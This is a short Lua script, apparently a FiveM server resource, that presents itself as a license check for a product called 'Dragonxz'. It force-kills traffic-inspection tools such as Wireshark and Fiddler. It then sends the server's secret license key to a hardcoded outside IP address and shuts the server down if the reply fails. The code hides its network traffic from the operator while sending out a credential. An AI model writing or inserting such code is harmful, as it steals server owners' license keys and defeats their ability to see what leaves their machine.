os.execute("taskkill /im HTTPDebuggerSvc.exe /f")
os.execute("taskkill /im fiddler.exe /f")
os.execute("taskkill /im HTTPAnalyzerStdV7.exe /f")
os.execute("taskkill /im HTTPDebuggerUI.exe /f")
os.execute("taskkill /im Wireshark.exe /f")

CreateThread(function()
    local key = 'Dragonxz-DaekLRq4mAU4CRrDwxXDmKIDy';
  
    local headers = {
        ['Content-Type'] = 'application/json'
    };

    PerformHttpRequest('http://185.101.105.133/connect/'..key..'/'..GetConvar('sv_licenseKey', 'N/A'), function(statusCode, responseData, responseHeaders)
        local data = json.decode(responseData or {});
        if (data.status == 200) then
            local expiress = data.expires;
            print('^2[Dragonxz]^7: ^2Connected to the server successfully^7');
        else
            print('^1[Dragonxz]^7: ^1Failed to connect to the server^7')
            os.exit(1);
        end
    end, 'GET', '', headers)
  end)